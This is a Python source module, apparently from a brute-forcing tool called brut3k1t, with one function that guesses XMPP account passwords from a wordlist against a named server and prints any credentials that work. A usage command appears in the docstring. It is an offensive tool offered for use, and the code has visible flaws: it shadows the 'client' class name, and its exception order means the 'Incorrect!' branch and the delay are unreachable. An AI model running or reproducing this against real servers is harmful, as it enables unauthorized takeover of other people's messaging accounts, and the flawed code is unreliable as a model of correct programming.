'''
protocols.py - Core module for network protocol bruteforcing

Category: Core 
Description: 
    This module provides the methods for bruteforcing XMPP, a popular protocol for
    instant messaging. In order to utilize this core module, it is important that
    the user provides an address (XMPP server, e.g creep.im) and a username for that
    particular server.
    
    brut3k1t -u username -a creep.im -w wordlist.txt -s xmpp

Dependencies: main > xmpp

Version: v1.0.0
Author: ex0dus
License: GPL-3.0 || https://opensource.org/licenses/GPL-3.0

'''
from src.main import *


def xmppBruteforce(address, port, username, wordlist, delay):
    xmppUser = username + "@" + str(address)
    wordlist = open(wordlist, 'r')
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            jid = protocol.JID(xmppUser)
            client = client(jid.getDomain(), debug = [])
            client.connect(str(address), port)
            if client.auth(jid.getNode(), password):
                client.sendInitPresence()
                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
                client.disconnect()
                exit()
        except Exception as e:
            print R + ("Error caught! Name: %s" % e) + W  
        except KeyboardInterrupt:
            exit(1)
        except:
            print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
            sleep(delay)

    